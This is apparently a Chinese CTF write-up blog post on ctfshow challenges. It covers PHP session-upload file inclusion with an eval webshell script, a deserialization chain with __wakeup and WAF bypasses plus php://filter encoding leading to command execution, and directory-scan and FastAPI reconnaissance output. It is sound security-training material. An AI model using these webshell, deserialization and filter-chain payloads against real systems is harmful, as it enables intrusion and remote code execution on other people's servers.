---
title: "ctfshow元旦水友赛"
date: 2025-11-04T19:54:13+08:00
summary: "ctfshow元旦水友赛"
url: "/posts/ctfshow元旦水友赛/"
categories:
  - "ctfshow"
tags:
  - "元旦水友赛"
draft: false
---

## easy_include

### #file协议的session文件包含

```php
<?php

function waf($path){
    $path = str_replace(".","",$path);
    return preg_match("/^[a-z]+/",$path);
}

if(waf($_POST[1])){
    include "file://".$_POST[1];
}
```

要求必须是小写字母开头，而且不能路径遍历

```http
1=localhost/etc/passwd
```

如果是根目录的话需要加上localhost

cookie开启了session，直接打session文件包含就行，这道题还不需要竞争

```python
import requests
# Author:ctfshow-h1xa

url = "http://233551ec-d2da-45e8-8af2-4653abab5cf2.challenge.ctf.show/"

data = {
    'PHP_SESSION_UPLOAD_PROGRESS': '<?php eval($_POST[2]);?>',
    '1':'localhost/tmp/sess_ctfshow',
    '2':'system("cat /flag_is_here.txt");'
}
file = {
    'file': 'ctfshow'
}
cookies = {
    'PHPSESSID': 'ctfshow'
}

response = requests.post(url=url,data=data,files=file,cookies=cookies)

print(response.text)
```

## easy_web

### #反序列化bypass+编码器处理垃圾字符

**php版本为5.5.9**

先不看waf了，先看下面的关键代码

```php
class ctf{
    public $h1;
    public $h2;

    public function __wakeup(){
        throw new Exception("fastfast");
    }

    public function __destruct()
    {
        $this->h1->nonono($this->h2);
    }
}

class show{

    public function __call($name,$args){
        if(preg_match('/ctf/i',$args[0][0][2])){
            echo "gogogo";
        }
    }
}

class Chu0_write{
    public $chu0;
    public $chu1;
    public $cmd;
    public function __construct(){
        $this->chu0 = 'xiuxiuxiu';
    }

    public function __toString(){
        echo "__toString"."<br>";
        if ($this->chu0===$this->chu1){
            $content='ctfshowshowshowwww'.$_GET['chu0'];
            if (!waf_in_waf_php($_GET['name'])){
                file_put_contents($_GET['name'].".txt",$content);
            }else{
                echo "绕一下吧孩子";
            }
                $tmp = file_get_contents('ctfw.txt');
                echo $tmp."<br>";
                if (!preg_match("/f|l|a|g|x|\*|\?|\[|\]| |\'|\<|\>|\%/i",$_GET['cmd'])){
                    eval($tmp($_GET['cmd']));
                }else{
                    echo "waf!";
                }

            file_put_contents("ctfw.txt","");
        }
        return "Go on";
        }
}
if (!$_GET['show_show.show']){
    echo "开胃小菜，就让我成为签到题叭";
    highlight_file(__FILE__);
}else{
    echo "WAF,启动！";
    waf1($_REQUEST);
    waf2($_SERVER['QUERY_STRING']);
    if (!preg_match('/^[Oa]:[\d]/i',$_GET['show_show.show'])){
        unserialize($_GET['show_show.show']);
    }else{
        echo "被waf啦";
    }

}
```

反序列化，先写个链子

```php
ctf::__destruct()->show::__call()->Chu0_write::__toString()
```

最终需要进入到`__toString`

本地调试一下链子

```php
<?php
class ctf{
    public $h1;
    public $h2;
}

class show{
}

class Chu0_write{
    public $chu0;
    public $chu1;
    public $cmd;
}
$Chu0_writ = new chu0_write();
$ctf = new ctf();
$ctf -> h1 = new show();
$ctf -> h2 = [
    [
        0 => "",
        1 => "",
        2 => $Chu0_writ
    ]
];
echo urlencode(serialize($ctf));

```

然后我们来看waf

```php
function waf1($Chu0){
    foreach ($Chu0 as $name => $value) {
        if(preg_match('/[a-z]/i', $value)){
            exit("waf1");
        }
    }
}
waf1($_REQUEST);
```

对键值对的值过滤了小写字母，`$_REQUEST`会同时接受*GET*和*post*里面的请求，但是*post*的优先级更高，所以随便传post传一个数字就能绕过就行了

```php
function waf2($Chu0){
    if(preg_match('/show/i', $Chu0))
        exit("waf2");
}
waf2($_SERVER['QUERY_STRING']);
```

会检查查询字符串是否包含show，因为我们需要传`show_show.show`才能进入else分支，可以用url编码进行绕过

```php
if (!preg_match('/^[Oa]:[\d]/i',$_GET['show_show.show'])){
        unserialize($_GET['show_show.show']);
```

经典的绕过wakeup方法，用C打头去绕过，用原生类ArrayObject类去打包一下

```php
<?php
class ctf{
    public $h1;
    public $h2;
}

class show{
}

class Chu0_write{
    public $chu0;
    public $chu1;
    public $cmd;
}
$Chu0_writ = new chu0_write();
$ctf = new ctf();
$ctf -> h1 = new show();
$ctf -> h2 = [
    [
        0 => "",
        1 => "",
        2 => $Chu0_writ
    ]
];
$arr = array("111"=>$ctf);
$poc = new ArrayObject($arr);
echo serialize($poc);
//C:11:"ArrayObject":176:{x:i:0;a:1:{i:111;O:3:"ctf":2:{s:2:"h1";O:4:"show":0:{}s:2:"h2";a:1:{i:0;a:3:{i:0;s:0:"";i:1;s:0:"";i:2;O:10:"Chu0_write":3:{s:4:"chu0";N;s:4:"chu1";N;s:3:"cmd";N;}}}}};m:a:0:{}}
```

接着我们看看`__toString`中的内容

```php
function waf_in_waf_php($a){
    $count = substr_count($a,'base64');
    echo "hinthinthint,base64喔"."<br>";
    if($count!=1){
        return True;
    }
    if (preg_match('/ucs-2|phar|data|input|zip|flag|\%/i',$a)){
        return True;
    }else{
        return false;
    }
}    

public function __toString(){
        echo "__toString"."<br>";
        if ($this->chu0===$this->chu1){
            $content='ctfshowshowshowwww'.$_GET['chu0'];
            if (!waf_in_waf_php($_GET['name'])){
                file_put_contents($_GET['name'].".txt",$content);
            }else{
                echo "绕一下吧孩子";
            }
            $tmp = file_get_contents('ctfw.txt');
```

需要chu0和chu1相等，并且会将content写入txt文件中，看到`waf_in_waf_php`函数中，要求要出现一次base64字符串且不能出现`ucs-2|phar|data|input|zip|flag|\%`，意图很明显了，我们需要往ctfw.txt里面写代码，那么这里的name就只能是包含ctfw+任何东西

但是这里可以看到$content里面有一堆垃圾字符会影响我们的chu0，需要用多次编码去处理垃圾字符，让垃圾字符为非法的base64字符，这样在base64解码的时候就会忽略这些字符

```php
<?php
$b="lajizufu";
$payload=iconv('utf8','utf-16',base64_encode($b));
echo quoted_printable_encode($payload);#输出为空，成功过滤垃圾字符
?>
```

最终可以得出我们的name参数

```bash
?name=php://filter/convert.quoted-printable-decode/convert.iconv.utf-16.utf-8/convert.base64-decode/resource=ctfw
```

然后对于传进去的chu0，我们构造一个system吧，但是这里也是需要编码的

```php
<?php
$b="system";
$payload=iconv('utf-8','utf-16',base64_encode($b));
echo quoted_printable_encode($payload);
?>
```

得到chu0的内容为`=FE=FF=00c=003=00l=00z=00d=00G=00V=00t`，只保留`c=003=00l=00z=00d=00G=00V=00t`

所以最后的poc

```http
POST /?%73%68%6f%77%5b%73%68%6f%77%2e%73%68%6f%77=%43%3a%31%31%3a%22%41%72%72%61%79%4f%62%6a%65%63%74%22%3a%31%38%34%3a%7b%78%3a%69%3a%30%3b%61%3a%31%3a%7b%73%3a%34%3a%22%65%76%69%6c%22%3b%4f%3a%33%3a%22%63%74%66%22%3a%32%3a%7b%73%3a%32%3a%22%68%31%22%3b%4f%3a%34%3a%22%73%68%6f%77%22%3a%30%3a%7b%7d%73%3a%32%3a%22%68%32%22%3b%61%3a%31%3a%7b%69%3a%30%3b%61%3a%33%3a%7b%69%3a%30%3b%73%3a%30%3a%22%22%3b%69%3a%31%3b%73%3a%30%3a%22%22%3b%69%3a%32%3b%4f%3a%31%30%3a%22%43%68%75%30%5f%77%72%69%74%65%22%3a%33%3a%7b%73%3a%34%3a%22%63%68%75%30%22%3b%4e%3b%73%3a%34%3a%22%63%68%75%31%22%3b%52%3a%31%31%3b%73%3a%33%3a%22%63%6d%64%22%3b%4e%3b%7d%7d%7d%7d%7d%3b%6d%3a%61%3a%30%3a%7b%7d%7d&name=php://filter/convert.quoted-printable-decode/convert.iconv.utf-16.utf-8/convert.base64-decode/resource=ctfw&chu0=c=003=00l=00z=00d=00G=00V=00t=00&cmd=env HTTP/1.1
Host: 1da8ff86-acfd-476f-af7e-bd35d193b284.challenge.ctf.show
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="139", "Not;A=Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: zh-CN,zh;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
Connection: keep-alive
Content-Length: 36
Content-Type: application/x-www-form-urlencoded

show[show.show=1&chu0=1&cmd=1&name=1
```

需要注意的是，序列化字符串需要url全编码，不然里面的show对象会触发waf2

## 孤注一掷

扫目录扫出好多东西

```bash
[19:43:12] Scanning:
[19:43:14] 200 -   10KB - /.DS_Store
[19:43:15] 200 -   221B - /.htaccess
[19:43:24] 403 -   555B - /application/
[19:43:24] 403 -   555B - /application/configs/application.ini
[19:43:24] 403 -   555B - /application/cache/
[19:43:24] 403 -   555B - /application/logs/
[19:43:24] 301 -   169B - /assets  ->  http://150aae15-d382-43f0-bb42-e37600dd5311.challenge.ctf.show/assets/
[19:43:24] 403 -   555B - /assets/
[19:43:26] 200 -   181B - /check.php
[19:43:30] 200 -   143B - /gotoURL.asp?url=google.com&id=43569
[19:43:31] 200 -   10KB - /install.php
[19:43:31] 200 -   10KB - /install.php?profile=default
[19:43:36] 200 -   143B - /plugins/servlet/gadgets/makeRequest?url=https://google.com
[19:43:37] 403 -   555B - /protected/runtime/
[19:43:38] 200 -    32B - /robots.txt
[19:43:39] 301 -   169B - /static  ->  http://150aae15-d382-43f0-bb42-e37600dd5311.challenge.ctf.show/static/
[19:43:40] 301 -   169B - /template  ->  http://150aae15-d382-43f0-bb42-e37600dd5311.challenge.ctf.show/template/
[19:43:40] 403 -   555B - /template/
[19:43:41] 301 -   169B - /uploads  ->  http://150aae15-d382-43f0-bb42-e37600dd5311.challenge.ctf.show/uploads/
[19:43:41] 403 -   555B - /uploads/
[19:43:43] 200 -  570KB - /www.zip
```

## easy_api

打开显示FastApi启动报告

```json
{"message":"fastapi startup complete"}
```

扫目录

```bash
[15:50:53] Scanning:
[15:51:12] 200 -    15B - /list
[15:51:14] 200 -    2KB - /openapi.json
[15:51:20] 307 -     0B - /upload  ->  http://d2b996ae-88fe-47db-9ec8-ebac71414e69.challenge.ctf.show/upload/
[15:51:20] 405 -    31B - /upload/
[15:51:20] 500 -    21B - /uploads/dump.sql
[15:51:20] 500 -    21B - /uploads/affwp-debug.log
```

访问openapi.json

`openapi.json` 是一个由 FastAPI 自动生成的 **API 接口描述文件**

```json
{
  "openapi": "3.1.0",
  "info": {
    "title": "FastAPI",
    "version": "0.1.0"
  },
  "paths": {
    "/upload/": {
      "post": {
        "summary": "Upload File",
        "operationId": "upload_file_upload__post",
        "requestBody": {
          "content": {
            "multipart/form-data": {
              "schema": {
                "$ref": "#/components/schemas/Body_upload_file_upload__post"
              }
            }
          },
          "required": true
        },
        "responses": {
          "200": {
            "description": "Successful Response",
            "content": {
              "application/json": {
                "schema": {

                }
              }
            }
          },
          "422": {
            "description": "Validation Error",
            "content": {
              "application/json": {
                "schema": {
                  "$ref": "#/components/schemas/HTTPValidationError"
                }
              }
            }
          }
        }
      }
    },
    "/uploads/{fileIndex}": {
      "get": {
        "summary": "Download File",
        "operationId": "download_file_uploads__fileIndex__get",
        "parameters": [
          {
            "name": "fileIndex",
            "in": "path",
            "required": true,
            "schema": {
              "type": "string",
              "title": "Fileindex"
            }
          }
        ],
        "responses": {
          "200": {
            "description": "Successful Response",
            "content": {
              "application/json": {
                "schema": {

                }
              }
            }
          },
          "422": {
            "description": "Validation Error",
            "content": {
              "application/json": {
                "schema": {
                  "$ref": "#/components/schemas/HTTPValidationError"
                }
              }
            }
          }
        }
      }
    },
    "/list": {
      "get": {
        "summary": "List File",
        "operationId": "list_file_list_get",
        "responses": {
          "200": {
            "description": "Successful Response",
            "content": {
              "application/json": {
                "schema": {

                }
              }
            }
          }
        }
      }
    },
    "/": {
      "get": {
        "summary": "Index",
        "operationId": "index__get",
        "responses": {
          "200": {
            "description": "Successful Response",
            "content": {
              "application/json": {
                "schema": {

                }
              }
            }
          }
        }
      }
    }
  },
  "components": {
    "schemas": {
      "Body_upload_file_upload__post": {
        "properties": {
          "file": {
            "type": "string",
            "format": "binary",
            "title": "File"
          }
        },
        "type": "object",
        "required": [
          "file"
        ],
        "title": "Body_upload_file_upload__post"
      },
      "HTTPValidationError": {
        "properties": {
          "detail": {
            "items": {
              "$ref": "#/components/schemas/ValidationError"
            },
            "type": "array",
            "title": "Detail"
          }
        },
        "type": "object",
        "title": "HTTPValidationError"
      },
      "ValidationError": {
        "properties": {
          "loc": {
            "items": {
              "anyOf": [
                {
                  "type": "string"
                },
                {
                  "type": "integer"
                }
              ]
            },
            "type": "array",
            "title": "Location"
          },
          "msg": {
            "type": "string",
            "title": "Message"
          },
          "type": {
            "type": "string",
            "title": "Error Type"
          }
        },
        "type": "object",
        "required": [
          "loc",
          "msg",
          "type"
        ],
        "title": "ValidationError"
      }
    }
  }
}
```

有三个接口，一个是POST类型的`/upload/`文件上传，GET类型的`/uploads/{fileIndex}`文件下载，GET类型的`/list`文件列表
